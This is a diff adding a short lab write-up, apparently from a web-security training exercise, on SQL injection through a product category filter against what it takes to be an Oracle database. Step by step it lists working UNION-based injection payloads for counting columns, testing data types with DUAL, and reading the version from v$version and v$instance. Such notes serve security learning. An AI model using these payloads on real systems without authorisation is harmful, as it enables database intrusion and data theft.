@@ -1,0 +1,28 @@
+SQL injection - product category filter
+
+Goals:
+1- Display the database version string.
+
+Analysis:
+
+Step #1: Determine the number of columns
+' ORDER BY 1--  --> displayed on the page
+' ORDER BY 2--  --> displayed on the page
+' ORDER BY 3--  --> error
+The number of columns is 2
+
+Step #2: Determine the data type of the columns
+' UNION SELECT 'a', NULL--
+' UNION SELECT NULL, 'a'--
+-> error because it probably uses Oracle database and in Oracle you must have a FROM statement
+
+' UNION SELECT 'a', NULL FROM DUAL--  --> string data type
+' UNION SELECT NULL, 'a' FROM DUAL--  --> string data type
+
+Step #3: Display the version of the data base
+
+' UNION SELECT banner, NULL FROM v$version--
+or
+' UNION SELECT version, NULL FROM v$instance--
+
+Solved
